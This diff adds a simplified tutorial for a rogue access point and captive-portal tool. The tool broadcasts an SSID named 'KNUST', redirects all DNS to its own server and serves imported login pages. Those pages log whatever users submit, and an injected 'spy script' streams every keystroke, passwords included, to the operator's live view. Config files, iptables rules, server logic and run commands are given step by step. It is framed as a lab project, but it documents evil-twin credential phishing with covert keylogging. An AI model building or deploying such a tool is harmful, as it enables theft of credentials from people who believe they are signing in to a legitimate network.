@@ -1,0 +1,465 @@
+LEARN THIS PROJECT — explained so simply a baby could follow
+==============================================================
+Folder: hostapd-with-any-captive-portal/
+You run ONE thing:  sudo ./run.sh
+Then you answer questions. That's it. Below is HOW it works inside.
+
+
+CHAPTER 0: THE BIG IDEA (hotel wifi)
+------------------------------------
+You know hotel wifi? You join the wifi, a page pops up, you click
+"Connect", then internet works. That pop-up page system is called
+a CAPTIVE PORTAL ("captive" = you are captured until you sign in).
+
+Our project builds one from 5 Lego blocks:
+
+  1. hostapd        = the radio tower. Shouts our wifi name (SSID).
+  2. dnsmasq        = the receptionist. Gives each guest a room
+                      number (IP address) and lies about directions
+                      (DNS) so every road leads to our page.
+  3. iptables       = the security guards. Block everyone, then
+                      open the door only for guests who clicked Connect.
+  4. portal_server  = the waiter. Shows the pretty page, and writes
+  (python)            your name on the "allowed" list when you click.
+  5. my-portals/    = the menu designs. Pretty pages you can swap.
+
+Picture the journey of a phone:
+
+  phone --join wifi--> hostapd --ask IP--> dnsmasq (gets 192.168.4.10)
+    --"where is google.com?"--> dnsmasq lies: "it's 192.168.4.1 (us!)"
+    --opens page--> portal_server shows my-portals/school-demo/
+    --clicks Connect--> portal_server tells iptables: "let this phone pass"
+    --internet works (only if mode = nat)--> happy student
+
+
+CHAPTER 1: hostapd — THE RADIO TOWER
+------------------------------------
+Your wifi card is normally a LISTENER (it joins other wifis).
+hostapd flips it into a SHOUTER (Access Point): it shouts
+"KNUST! KNUST! Join me!" 10 times per second. Phones hear it.
+
+run.sh writes a tiny config file, run/hostapd.conf. Example:
+
+  interface=wlan1        # which wifi card shouts (wlan1 is free, wlan0 is busy)
+  driver=nl80211         # the language Linux uses to talk to wifi cards
+  ssid=KNUST             # the name phones see
+  hw_mode=g              # 2.4 GHz band (travels far, passes walls)
+  channel=6              # which "lane" of the radio road we shout on
+  auth_algs=1            # allow open + password logins
+  wpa=2                  # WPA2 password protection is ON (wpa=0 means open)
+  wpa_passphrase=12345678
+  wpa_key_mgmt=WPA-PSK
+  rsn_pairwise=CCMP      # the secret-code math WPA2 uses
+
+Then run.sh starts it like this (simplified):
+
+  hostapd -B -P run/hostapd.pid -f run/hostapd.log run/hostapd.conf
+
+  -B  = go to background (like minimizing a window)
+  -P  = write your ID number (PID) in this file so we can stop you later
+  -f  = write your diary (log) here
+
+How do we know it worked? hostapd writes "AP-ENABLED" in its diary.
+run.sh watches the diary for 10 seconds:
+
+  for i in 1 2 3 ... 20; do
+    sleep 0.5
+    grep -q "AP-ENABLED" run/hostapd.log && echo "IT WORKS!"
+  done
+
+If instead it sees "Could not configure driver mode", it means someone
+else (old hostapd, NetworkManager) is still holding the wifi card.
+That's why run.sh first kills leftovers:
+
+  pkill -f "hostapd.*run/hostapd.conf"   # kill old tower using OUR config
+
+Baby version: hostapd = a megaphone. Config = what to shout.
+AP-ENABLED = "megaphone is ON".
+
+
+CHAPTER 2: dnsmasq — THE RECEPTIONIST (gives IPs + lies about DNS)
+------------------------------------------------------------------
+A phone joins but has no address. dnsmasq does TWO jobs:
+
+JOB A — DHCP (room numbers):
+"Welcome! Your room is 192.168.4.10. The boss lives at 192.168.4.1."
+run/dnsmasq.conf example:
+
+  interface=wlan1                 # only serve our wifi guests
+  bind-interfaces                 # don't touch other networks
+  dhcp-range=192.168.4.10,192.168.4.100,12h   # rooms 10..100, 12-hour stay
+  dhcp-option=3,192.168.4.1       # "the door out (gateway) is .1"
+  dhcp-option=6,192.168.4.1       # "ask .1 for directions (DNS)"
+
+JOB B — DNS lying (the magic trick!):
+Normally DNS turns names into numbers: google.com -> 142.250.x.x.
+We LIE and say EVERY name is us:
+
+  address=/#/192.168.4.1          # "#/ = every name on Earth -> our page"
+
+So the phone asks "where is google.com?" and we answer "right here,
+at our pretty page!" That's how the pop-up appears by itself.
+
+Baby version: dnsmasq = a hotel receptionist who gives you a room
+key AND gives wrong directions on purpose so you always walk into
+the lobby (our login page) first.
+
+
+CHAPTER 3: iptables — THE SECURITY GUARDS
+-----------------------------------------
+iptables is Linux's built-in bouncer. It checks every packet
+(a tiny envelope of internet data) and decides PASS or STOP.
+It has TABLES (buildings) and CHAINS (hallways of guards).
+
+We set up 3 guard posts (simplified from run.sh):
+
+  # GUARD 1: everyone knocking on web pages gets sent to OUR waiter
+  iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j CAPTIVE_HTTP
+  iptables -t nat -A CAPTIVE_HTTP -p tcp --dport 80 -j DNAT --to 192.168.4.1:80
+
+  Translation: "Any guest asking for ANY website on port 80?
+  Rewrite the envelope address to OUR page instead."
+
+  # GUARD 2: let guests talk to reception (DHCP, DNS, our page)
+  iptables -A INPUT -i wlan1 -p udp --dport 53 -j ACCEPT   # DNS ok
+  iptables -A INPUT -i wlan1 -p udp --dport 67 -j ACCEPT   # DHCP ok
+  iptables -A INPUT -i wlan1 -p tcp --dport 80 -j ACCEPT   # our page ok
+
+  # GUARD 3: NOBODY may walk through to the internet... except:
+  iptables -A FORWARD -i wlan1 -j DROP   # default: STOP everyone
+
+When a guest clicks Connect, portal_server adds a VIP pass
+at the FRONT of the line (position 1 = checked first!):
+
+  iptables -I FORWARD 1 -i wlan1 -m mac --mac-source AA:BB:CC:DD:EE:FF -j ACCEPT
+  iptables -t nat -I CAPTIVE_HTTP 1 -m mac --mac-source AA:BB:CC:DD:EE:FF -j RETURN
+
+  Translation: "Phone with this fingerprint (MAC)? Let it pass,
+  and stop redirecting its web pages."
+
+Guards check top-to-bottom, so VIP passes (added later, at top)
+beat the DROP rule (at bottom). Clever, right?
+
+BONUS — nat mode (sharing real internet):
+If you picked mode "nat", we also do this:
+
+  sysctl -w net.ipv4.ip_forward=1                          # allow carrying letters between networks
+  iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE     # disguise guest letters as OUR letters
+
+MASQUERADE = putting on a mask. Guest packets leave through wlan0
+wearing our face, replies come back, we unmask and deliver.
+In "isolated" mode we skip this: guests see only the portal. 
+
+Baby version: iptables = guards with lists. Default list says NO.
+Clicking Connect writes your name at the TOP of the YES list.
+
+
+CHAPTER 4: portal_server.py — THE WAITER (python, no extra installs!)
+---------------------------------------------------------------------
+Only Python's built-in toolbox (http.server). No Flask, no extras.
+It does 4 things. Here is each one, simplified:
+
+THING 1 — show files:
+  def do_GET(self):
+      # phone asks for "/"  -> send my-portals/school-demo/index.html
+      # phone asks for "/style.css" -> send that file
+      # phone asks for "/generate_204" (Android checking wifi)
+      #   -> answer "go to http://192.168.4.1/" so the pop-up opens
+
+THING 2 — which page is the "front door"?
+Old portals use different names (index.html? login.html?).
+This little helper tries each one (real code, shortened):
+
+  def resolve_entry(folder):
+      if folder has manifest.json with "entry": use it
+      if index.html exists: use it
+      if login.html exists: use it
+      else: use the first *.html file
+
+THING 3 — the Connect button (ANY form works!):
+Whether the page posts to /auth, /login or login.php,
+we do the same: write down what they typed, allow their MAC,
+send them to /success (real code, shortened):
+
+  def do_POST(self):
+      form = read the typed fields (username=...&password=...)
+      write form into run/submissions.log      # the notebook
+      mac = look up phone's fingerprint in /proc/net/arp
+      add mac to run/authorized_macs           # the YES list
+      run iptables to let this mac pass        # tell the guards
+      redirect phone to http://192.168.4.1/success
+
+How do we know the phone's fingerprint (MAC)?
+Linux keeps a neighbors book at /proc/net/arp:
+
+  IP address       HW address           Device
+  192.168.4.10     aa:bb:cc:dd:ee:ff    wlan1
+
+We read that book. IP 192.168.4.10 asked us? Its MAC is aa:bb:...
+Allow THAT. (That's also why it only works for real wifi clients,
+not for your own laptop testing on localhost — no ARP entry there.)
+
+THING 4 — live typing (the foot window!):
+Every page gets a tiny spy script injected before </body>:
+
+  <script src="/keys.js"></script>
+
+keys.js listens to every keypress and, 0.4 seconds after you stop
+typing in a field, whispers to the server:
+
+  fetch("/keys", {method:"POST",
+    body: JSON.stringify({field:"password", value:"sec"})})
+
+The server keeps it in memory:  live["192.168.4.10"] = {password: "sec"}
+and live_view.py (in your foot window) asks "what's new?" every second:
+
+  GET /live         -> {"192.168.4.10": {"mac": "aa:bb:..", "fields": {...}}}
+  GET /submissions  -> last lines of run/submissions.log
+
+/live and /submissions ONLY answer localhost (your own machine),
+so wifi guests can never peek at them. Try from a guest? 403!
+
+Baby version: portal_server = a waiter. Shows menu (GET),
+takes order (POST), writes your name on the VIP list,
+and peeks at what you're writing (keys.js) to show mama (you).
+
+
+CHAPTER 5: my-portals/ — THE MENU DESIGNS
+-----------------------------------------
+A portal = just a folder with web files! To add yours:
+
+  cp -r my-portals/_template my-portals/my-shop   # copy starter
+  # edit my-portals/my-shop/index.html however you like
+  sudo ./run.sh                                    # pick "my-shop" in the list!
+
+run.sh finds portals by looking for ANY *.html file:
+
+  for d in my-portals/*/; do
+      if folder d has any .html file: list it!
+  done
+
+So it auto-detects whatever you drop in — no config editing ever.
+RULES for your page (only 2!):
+  1. Your button must live in <form method="POST" action="/auth">
+     (action can also be /login or login.php — all work the same)
+  2. Name your inputs: <input name="student_id"> so the notebook
+     (submissions.log) shows WHAT was typed, not just "something".
+
+Example — smallest portal in the world (this actually works!):
+
+  <!doctype html>
+  <form method="POST" action="/auth">
+    <input name="nickname" placeholder="Your name">
+    <button>Connect</button>
+  </form>
+
+That's it. Style it, add pictures (keep them small/inline —
+guests have no internet yet, so Google Fonts/CDNs will NOT load!).
+
+
+CHAPTER 6: run.sh — THE CONDUCTOR (orchestra leader)
+----------------------------------------------------
+run.sh asks questions, THEN does 8 steps in order. Read it like a recipe:
+
+  STEP 0  root check        -> "Are you the boss? (sudo)" If no, stop.
+  STEP 1  ask iface         -> show wifi cards, you pick (wlan1 = free one)
+  STEP 2  ask mode          -> isolated (portal only) or nat (share internet)
+  STEP 3  ask portal        -> list my-portals/*/ (auto-detected!)
+  STEP 4  ask ssid/password -> wifi name + password (type 'open' = no password)
+  STEP 5  write last.conf   -> remember answers as next time's defaults
+  STEP 6  prepare card      -> kill leftovers, NetworkManager hands off,
+                               give card the address 192.168.4.1
+  STEP 7  start 4 services  -> hostapd (tower) -> wait AP-ENABLED
+                               dnsmasq (receptionist)
+                               iptables (guards)
+                               portal_server (waiter) + foot live window
+  STEP 8  menu loop         -> [s] switch portal  [l] live window
+                               [c] clients        [q] quit + clean everything
+
+[q]/Ctrl+C runs cleanup(): kill all 4, delete guard rules,
+remove the .1 address, give the card back to NetworkManager.
+Like we were never there. stop.sh does the same from another terminal.
+
+Baby version: run.sh = a recipe robot. Asks what cake you want,
+then bakes it step by step, then washes ALL dishes after.
+
+
+CHAPTER 7: THE OTHER FILES (one line each)
+------------------------------------------
+  setup.sh       -> installs hostapd/dnsmasq/iptables once (apt install).
+  stop.sh        -> emergency stop button from a second terminal.
+  live_view.py   -> the foot-window program: asks /live + /submissions
+                    every second, clears screen, prints nicely. No root needed.
+  config.yaml    -> default answers (you never NEED to edit it).
+  run/           -> diary folder: *.log diaries, *.pid ID numbers,
+                    authorized_macs (VIP list), submissions.log (notebook),
+                    last.conf (remembered answers).
+  Old/           -> copy of the previous bigger project (14 portals imported
+                    from Old/portals/ + ideas like /keys live typing).
+  README.md      -> short instructions for grown-ups in a hurry.
+
+
+CHAPTER 8: TRY IT YOURSELF (tiny experiments)
+---------------------------------------------
+1. See auto-detect:  mkdir my-portals/test  + put the 5-line example
+   from Chapter 5 inside as index.html -> sudo ./run.sh -> "test" appears!
+2. See DNS lying: join the AP, run:  nslookup google.com
+   Answer is ALWAYS 192.168.4.1. The receptionist lies. 
+3. See the guards:  sudo iptables -L FORWARD   (DROP at bottom,
+   ACCEPT lines on top after someone clicks Connect)
+4. See the waiter alone (no wifi needed!):
+   python3 portal_server.py --portal-dir my-portals/school-demo \
+     --port 8080 --ap-iface lo --state-file /tmp/m --submit-log /tmp/s
+   then open http://127.0.0.1:8080/ in your browser. Type, click,
+   watch /tmp/s fill up. Ctrl+C to stop.
+5. See live typing: open TWO terminals. Terminal 1 runs the server
+   above. Terminal 2 runs:  python3 live_view.py --port 8080
+   Type in the browser page -> watch Terminal 2 update letter by letter!
+
+
+GLOSSARY (baby dictionary)
+--------------------------
+  AP ................. Access Point. The wifi shouter. (hostapd makes one)
+  SSID ............... The wifi NAME you see on your phone. ("KNUST")
+  IP ................. A computer's house number. Ours: 192.168.4.x
+  MAC ................ A device's fingerprint. Never changes. (aa:bb:cc:...)
+  DHCP ............... "Please give me a house number." (dnsmasq answers)
+  DNS ................ "Where lives google.com?" phone book. (we lie in it)
+  NAT/MASQUERADE ..... Sharing one internet face with many guests.
+  ARP ................ Linux's neighbors book: which IP lives in which MAC.
+  iptables ........... Linux's bouncers. Lists of ALLOW and DROP.
+  302 redirect ....... Server says "actually, go to THIS address instead."
+                       (how phones get pushed to our page)
+  captive probe ...... Secret check phones do: "am I online?"
+                       (Android asks /generate_204 and expects EMPTY 204.
+                       We answer with our page instead -> pop-up opens!)
+  PID ................ Process ID number. Like a ticket to find/kill a program.
+  localhost .......... "This computer itself" (127.0.0.1). Only YOU, no guests.
+
+THE END. You now know more than most grown-ups about wifi.
+Go break things safely in your own lab.
+
+
+================================================================
+APPENDIX N: NERD DETAILS (exact behavior of THIS codebase)
+================================================================
+N1. NETWORK NUMBERS
+  Subnet 192.168.4.0/24. Gateway .1 on the AP iface. DHCP pool
+  .10-.100, 12h leases (run/dnsmasq.leases). All configurable at the
+  run.sh prompts; gateway prefix auto-derives the default pool via
+  PREFIX="${GATEWAY%.*}".
+
+N2. HOSTAPD, PRECISELY
+  - driver nl80211 = generic Linux wifi driver API (netlink). hostapd
+    uses it to flip the card from "managed" to "AP" mode and beacon.
+  - hw_mode=g + channel 6 = 2.4 GHz 802.11g, 2437 MHz. 2.4 GHz chosen
+    because cheap adapters (e.g. MT7601U-class, like wlan1 here) often
+    lack 5 GHz AP support. Check yours: `iw list | grep -A8 'Band 2'`.
+  - WPA2-PSK: wpa=2, key_mgmt WPA-PSK, pairwise CCMP (AES). No WPA3/SAE
+    (older adapters choke on it). wpa=0 + auth_algs=1 = open network.
+  - -B daemonizes (double-fork); only then is -P pidfile reliably
+    written — that exact bug caused the "AP-ENABLED but reported failed"
+    incident. Success = log poll: 20 x 0.5 s for "AP-ENABLED"; abort on
+    AP-DISABLED|driver initialization failed|Could not configure driver
+    mode|CTRL-EVENT-TERMINATING.
+  - "Could not configure driver mode" = nl80211 SET_INTERFACE failed:
+    iface busy (stale hostapd, wpa_supplicant, NM) or driver/firmware
+    lacks AP mode on that channel. Pre-start pkill + `nmcli managed no`
+    + wpa_supplicant kill is the mitigation, in that order.
+
+N3. DNSMASQ, PRECISELY
+  - bind-interfaces + interface=<ap> + except-interface=lo: socket binds
+    to the AP iface only, so it coexists with systemd-resolved's
+    127.0.0.53 stub and NM's dnsmasq (different sockets, no conflict).
+  - address=/#/gw = wildcard A-record synthesis: ANY qname -> gw.
+    AAAA (IPv6) queries are NOT answered -> clients with IPv6 upstream
+    may briefly escape the portal over v6. Real fix would be ip6tables
+    rules or silencing router advertisements. Known limitation,
+    documented here instead of fixed.
+  - dhcp-option 3 = Router, 6 = DNS server (RFC 2132). Lease file and
+    log paths live under run/ so every session starts clean.
+  - Upstream resolvers (8.8.8.8/1.1.1.1) only in nat mode; isolated mode
+    has no-resolv + no servers, dnsmasq is authoritative-for-everything.
+
+N4. IPTABLES PACKET WALK (typical client HTTP in nat mode)
+  1. nat/PREROUTING: -i ap -p tcp --dport 80 -> CAPTIVE_HTTP chain.
+     Unauthorized: DNAT to $gw:80 (dst rewrite, connection tracked).
+     Authorized: top-inserted `-m mac --mac-source X -j RETURN` skips DNAT.
+  2. Routing decision: DNAT-to-local -> INPUT (portal). Non-DNAT ->
+     FORWARD (needs ip_forward=1 + MASQUERADE to leave via upstream).
+  3. filter/FORWARD: top-inserted per-MAC ACCEPTs first, then the base
+     `-i ap -j DROP`, i.e. default-deny with per-MAC holes. ESTABLISHED
+     rule covers return traffic upstream->client in nat mode.
+  4. HTTPS (443) is deliberately untouched: no cert, no MITM, so 443 to
+     the open internet just gets FORWARD-DROPped (timeout). OS detection
+     still works because Android/iOS/Windows all probe plain HTTP first
+     (generate_204 / hotspot-detect.html / connecttest.txt / ncsi.txt),
+     which we 302 to the portal. HSTS-preloaded real sites will error
+     on clients until authorized — expected, not a bug.
+  - Rule hygiene: every -A has a matching -C guard (idempotent re-runs)
+    and cleanup()/stop.sh deletes in reverse: per-MAC ACCEPTs (iterated
+    from run/authorized_macs), PREROUTING jump, flush+delete CAPTIVE_HTTP,
+    base INPUT/FORWARD rules, MASQUERADE, then the /24 address.
+
+N5. PORTAL SERVER INTERNALS
+  - ThreadingHTTPServer: one thread per connection; BaseHTTPRequestHandler
+    instance per request. Shared state on `server` (.authorized set,
+    .live dict, .cfg dict) — CPython GIL makes set-add/dict-write atomic
+    enough here; worst case a duplicate iptables insert, guarded by -C.
+  - Probes matched by exact path set (generate_204, gen_204, generate204,
+    hotspot-detect.html, connecttest.txt, ncsi.txt, success.txt, redirect,
+    canonical.html, kindle-wifi stub, library/test/success.html) plus
+    prefix match (hotspot-detect*, generate_*, ...). All -> 302 to gw root
+    with Cache-Control: no-store (else OSes cache the portal page!).
+  - Entry resolution: manifest.json "entry" (basename only, traversal-safe)
+    -> index.html -> login.html -> first sorted *.html.
+  - Path traversal: normpath + startswith("..") + isabs + isfile checks;
+    %2e encodings are harmless (never URL-decoded before normpath, so they
+    resolve to literal filenames, not directories).
+  - POST parsing: Content-Length bytes -> parse_qs (urlencoded). JSON bodies
+    on non-/keys paths parse to {} and still authorize (click=open model).
+  - Truncation: keys field<=50B, value<=200B in memory; submits field<=100B
+    in log. MACs lowercased + regex-validated before storing.
+  - authorized_macs: one lowercase MAC per line; reloaded at startup so a
+    portal restart (switch via [s]) preserves VIPs. iptables VIPs are NOT
+    re-added on restart (file says yes, kernel says no until re-auth) —
+    known inconsistency, harmless in practice.
+  - Keys.js injection: byte-level, only into .html responses missing the
+    marker, only when --live=on. 400 ms debounce per field client-side;
+    server keeps {mac, fields, updated}, prunes entries idle >600 s on
+    every /keys POST and /live GET.
+  - /live + /submissions: source IP must be 127.0.0.1 or ::1 else 403.
+    /submissions?limit=N clamped to 1..50, default 10, tails the file.
+  - allow_mac() no-ops iptables when euid!=0 (localhost lab mode) but
+    still records auth — that's why the Chapter 8 experiment works
+    unprivileged.
+
+N6. ARP LOOKUP QUIRKS
+  /proc/net/arp columns: IP HWtype Flags HWaddr Mask Device. Entries appear
+  only after L2 traffic (DHCP + first HTTP hit guarantees presence for real
+  clients). Incomplete entries (00:00:00:00:00:00, flags 0x0) are rejected
+  by the MAC regex. Multiple ifaces: first IP match wins regardless of
+  Device column — fine for a single-AP lab, wrong for multi-AP.
+
+N7. RUN.SH STATE MACHINE NOTES
+  - last.conf is `source`d: values are double-quoted, so SSIDs with spaces
+    survive; a hostile last.conf could execute code — it's root-written by
+    us, acceptable, but don't hand-edit it with untrusted content.
+  - `ask()` treats empty input as "keep default", so open networks need the
+    explicit `open|none|-` keyword (case-insensitive for open/none).
+  - Menu `read -rsn1` reads one silent char; pasted/escaped input may queue
+    and trigger multiple actions — cosmetic only.
+  - foot launch: sudo wipes WAYLAND_DISPLAY/XDG_RUNTIME_DIR (env_reset), so
+    we re-inject them via `sudo -u $SUDO_USER env ... foot`. If the
+    compositor still refuses, the printed manual fallback
+    `python3 live_view.py --port 80` in a user terminal always works.
+
+N8. KNOWN LIMITS (not bugs — physics and protocol)
+  1. IPv6 escape (see N3). 2. HTTPS timeout pre-auth (see N4).
+  3. Portal-switch keeps auth file but not kernel VIPs (see N5).
+  4. One radio = one AP: channel/SSID shared by all portals; switching
+     portal restarts only the HTTP layer, never hostapd (by design — fast).
+  5. Range/throughput = your USB adapter's firmware, not this code.
+  6. Some Android builds cache 204 results: toggle wifi off/on on the
+     client if the pop-up doesn't appear after a portal switch.
+Go break things safely in your own lab. 
